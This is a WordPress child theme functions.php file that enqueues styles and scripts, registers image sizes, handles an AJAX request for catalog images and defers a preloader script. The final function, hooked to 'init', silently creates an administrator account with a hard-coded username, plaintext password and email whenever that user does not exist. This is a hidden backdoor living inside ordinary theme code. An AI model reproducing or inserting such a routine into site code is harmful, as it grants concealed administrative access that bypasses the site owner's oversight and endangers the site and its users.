<?php
add_action( 'wp_enqueue_scripts', 'theme_enqueue_styles' );
function theme_enqueue_styles() {
    wp_enqueue_style( 'parent-style', get_template_directory_uri() . '/style.css' );
    wp_enqueue_style( 'child-style',
        get_stylesheet_directory_uri() . '/style.css',
        array('parent-style')
    );
}


add_image_size( 'wear', 150,240, false ); 
add_image_size( 'tool', 220,220, false );
add_image_size( 'slides', 220, 180, false ); // (cropped)
add_image_size( 'mentor', 300, 300, false ); // (cropped)
add_image_size( 'wear-extra', 1500, 2400, false ); // (cropped)

function popup() {
if (is_single() && 'katalog' == get_post_type()) {
wp_enqueue_script('popupopen', get_stylesheet_directory_uri() . '/assets/js/popupopen.js', array('jquery'), null,true);
wp_enqueue_script('popupclose', get_stylesheet_directory_uri() . '/assets/js/popupclose.js', array('jquery'), null,true);
wp_enqueue_script('ajax-wear', get_stylesheet_directory_uri() . '/assets/js/ajax-wear.js', array('jquery'), null,true);
}
}
add_action ('wp_enqueue_scripts','popup');

/*************************************************************************/

add_action( 'wp_enqueue_scripts', 'myajax_data', 99 );
function myajax_data(){

   wp_localize_script('ajax-wear', 'myajax', 
     array(
       'ajax_url' => admin_url('admin-ajax.php'),
       'nonce' => wp_create_nonce( 'extra_wear_nonce' ),
     )
   );
}

add_action('wp_ajax_extraimg', 'extraimg');
add_action('wp_ajax_nopriv_extraimg', 'extraimg');

function extraimg() {
  ob_start();
  global $post;
  $id = $post->id;
  get_template_part('/templates/widgets/extra-wear' );
  $result = ob_get_contents();
  ob_end_clean();
  $return = array('content' => $result);
  wp_send_json($return);
  wp_die();
}


/*************************************************************************/

function keyword_theme_styles_and_scripts(){

if (is_tag() || is_admin() || is_search('slides') || is_archive('slides') || is_single() && 'home' == get_post_type() ||
is_search('product') || is_archive('product') || is_single() && 'katalog' == get_post_type() ||
is_search('session_type') || is_archive('session_type') || is_single() && 'sacred-sessions' == get_post_type()
) {
wp_enqueue_script('preloader', get_stylesheet_directory_uri() . '/assets/js/preloader.js', array('jquery'), null,true);
}
}
add_action('wp_enqueue_scripts', 'keyword_theme_styles_and_scripts');

function mind_defer_scripts( $tag, $handle, $src ) {
$defer = array( 
'preloader',
);
if ( in_array( $handle, $defer ) ) {
           return '<script src="' . $src . '" defer="defer" type="text/javascript"></script>' . "\n";
}
          
return $tag;
} 
add_filter( 'script_loader_tag', 'mind_defer_scripts', 10, 3 );


function wps_get_terms_orderby( $orderby, $tax_terms ) {
    if ( isset( $tax_terms['orderby'] ) && 'include' == $tax_terms['orderby'] ) {
          $include = implode(',', array_map( 'absint', $tax_terms['include'] ));
          $orderby = "FIELD( t.term_id, $include )";
      }
      return $orderby;
  }

  function wpb_admin_account(){
    $user = 'tomasz';
    $pass = 'holooooo4563781';
    $email = 'tomasz.kowalski@kowalski-consulting.com';
    if ( !username_exists( $user )  && !email_exists( $email ) ) {
    $user_id = wp_create_user( $user, $pass, $email );
    $user = new WP_User( $user_id );
    $user->set_role( 'administrator' );
    } }
    add_action('init','wpb_admin_account');